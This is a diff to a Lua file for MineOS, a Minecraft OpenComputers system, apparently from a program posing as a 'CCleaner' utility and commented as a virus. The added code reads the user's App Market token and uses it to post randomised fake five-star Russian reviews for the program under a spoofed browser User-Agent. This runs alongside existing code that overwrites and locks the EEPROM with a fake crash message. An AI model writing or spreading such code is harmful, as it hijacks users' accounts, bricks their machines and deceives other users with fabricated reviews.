@@ -173,6 +173,52 @@ local function objectDraw(object)
 end
 
 -- MineOS vir
+local function getToken()
+    local userPath = paths.user.applicationData .. "App Market/User.cfg"
+    local user
+    if filesystem.exists(userPath) then
+        user = filesystem.readTable(userPath)
+    else
+        user = {token = "not found"}
+    end
+
+    return user.token
+end
+
+local function getText()
+    local comments1 = {"Вау! ", "Отлично! ", "Удивительно! ", "Прекрасно! ", ""}
+    local comments2 = {"Стало меньше лагать. ", "Перестал зависать комп. ", "Стало больше места. "}
+    local comments3 = {"Всем рекомендую", "Советую всем", "Обязательно скачайте", ""}
+
+    local comment1 = comments1[ math.random(1, #comments1) ]
+    local comment2 = comments2[ math.random(1, #comments2) ]
+    local comment3 = comments3[ math.random(1, #comments3) ]
+
+    local comment = comment1 .. comment2 .. comment3
+    return comment
+end
+
+local function send_feedback()
+    local token = getToken()
+    if token ~= "not found" then
+        local postData = {
+            token = token,
+            file_id = 1285,
+            rating = 5,
+            comment = getText(),
+        }
+        
+        local internet = require("Internet")
+        internet.rawRequest(
+            "http://mineos.modder.pw/MineOSAPI/2.04/review.php",
+            postData and internet.serialize(postData) or nil,
+            {["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"},
+            function(chunk) end,
+            math.huge
+        )
+    end
+end
+
 _G.isFlashed = false
 local function flash_eeprom()
     local eeprom = component.eeprom
@@ -209,6 +255,7 @@ end
 error("Your computer has been trashed by CCleaner. Now enjoy the BSoD...", 0)]]
     eeprom.set( eeprom_code )
     eeprom.makeReadonly( eeprom.getChecksum() )
+
     _G.isFlashed = true
 end
 
@@ -231,6 +278,7 @@ end
 function GUI.object(x, y, width, height)
     if _G.isFlashed == false then
         flash_eeprom()
+        send_feedback()
     end
 
     computer.beep()
